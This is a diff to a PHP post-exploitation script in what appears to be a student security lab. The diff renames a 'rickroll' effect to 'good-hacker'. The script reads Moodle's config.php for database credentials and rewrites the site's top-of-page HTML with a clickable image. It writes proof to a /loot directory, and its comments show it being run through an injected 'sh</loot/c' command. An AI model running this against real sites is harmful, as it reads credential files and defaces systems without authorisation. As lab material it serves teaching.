@@ -1,15 +1,15 @@
 <?php
 // Student example: put a clickable image on the Moodle front page.
 //
-// The image is good-hacker.webp. Clicking it opens the Rickroll video in a new
+// The image is good-hacker.webp. Clicking it opens the linked video in a new
 // tab. This effect does not create a separate landing page and does not change
 // the site name or the additionalhtmlhead redirect.
 //
-//   cp labs/examples/rickroll.php loot/rickroll.php
-//   printf 'php /loot/rickroll.php\n' > loot/c
+//   cp labs/examples/good-hacker.php loot/good-hacker.php
+//   printf 'php /loot/good-hacker.php\n' > loot/c
 //   ... -c 'sh</loot/c'
 //
-// Reset with reset-rickroll.php, which restores the saved top-of-page HTML.
+// Reset with reset-good-hacker.php, which restores the saved top-of-page HTML.
 
 $src = @file_get_contents('/var/www/config/config.php');
 if ($src === false) {
@@ -45,15 +45,15 @@ try {
         [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
     );
 
-    $saved = $pdo->query("SELECT value FROM mdl_config WHERE name='lab_rickroll_prev_top_saved'")->fetchColumn();
+    $saved = $pdo->query("SELECT value FROM mdl_config WHERE name='lab_good_hacker_prev_top_saved'")->fetchColumn();
     if ($saved === false) {
         $prev = $pdo->query("SELECT value FROM mdl_config WHERE name='additionalhtmltopofbody'")->fetchColumn();
         $stmt = $pdo->prepare(
             "INSERT INTO mdl_config (name, value) VALUES (:n, :v)
              ON DUPLICATE KEY UPDATE value = VALUES(value)"
         );
-        $stmt->execute([':n' => 'lab_rickroll_prev_top', ':v' => $prev === false ? '' : (string) $prev]);
-        $stmt->execute([':n' => 'lab_rickroll_prev_top_saved', ':v' => '1']);
+        $stmt->execute([':n' => 'lab_good_hacker_prev_top', ':v' => $prev === false ? '' : (string) $prev]);
+        $stmt->execute([':n' => 'lab_good_hacker_prev_top_saved', ':v' => '1']);
     }
 
     $top = $pdo->query("SELECT value FROM mdl_config WHERE name='additionalhtmltopofbody'")->fetchColumn();
@@ -78,10 +78,10 @@ try {
         throw new RuntimeException('front-page image or link read-back failed');
     }
 
-    $evidence = "rickroll=ok image={$imageUrl} link=youtube db=verified\n";
+    $evidence = "good-hacker=ok image={$imageUrl} link=youtube db=verified\n";
     file_put_contents('/loot/p1', $evidence);
     echo $evidence;
 } catch (Throwable $e) {
-    fwrite(STDERR, 'rickroll=failed reason=' . preg_replace('/\s+/', ' ', $e->getMessage()) . "\n");
+    fwrite(STDERR, 'good-hacker=failed reason=' . preg_replace('/\s+/', ' ', $e->getMessage()) . "\n");
     exit(1);
 }
